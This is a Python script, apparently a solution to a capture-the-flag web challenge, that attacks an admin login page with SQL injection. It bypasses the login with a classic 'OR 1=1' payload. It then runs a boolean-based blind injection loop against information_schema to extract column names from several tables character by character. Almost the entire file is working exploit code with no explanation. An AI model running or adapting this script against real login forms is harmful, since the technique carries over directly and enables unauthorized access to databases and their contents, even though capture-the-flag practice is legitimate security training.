import requests
import json

url = "http://csie.ctf.tw:10110/admin.php"

def test(user):

    password = ""
    data = {
            "username"  :   user,
            "password"  :   password
    }
    r = requests.post(url, data=data)
    return r.text


if __name__ == '__main__':

    result_success = test("1' OR 1=1 #")

    table_names = ['id', 'attack', 'map', 'mms', 'npc', 'npc1', 'set']
    for t in table_names:
        print "table %s" % t
        columns = []
        try:
            table_index = 0
            while True:
                char_index = 1
                string = ""
                while True:
                    ascii_value = -1
                    while True:
                        user = "1' or ascii(substring( (select COLUMN_NAME from " + \
                               "information_schema.columns WHERE TABLE_NAME = '" + t + "' " + \
                               "LIMIT {},1), {}, 1))> {} #".format(
                                    table_index, char_index, ascii_value
                               )
                        print user
                        result_string = test(user)
                        if result_string != result_success:
                            break
                        ascii_value += 1

                    if ascii_value == 0:
                        break
                    string += chr(ascii_value)
                    char_index += 1
                print string
                table_index += 1
                columns.append(string)
        except:
            pass
        finally:
            print t,
            print " : ",
            print columns
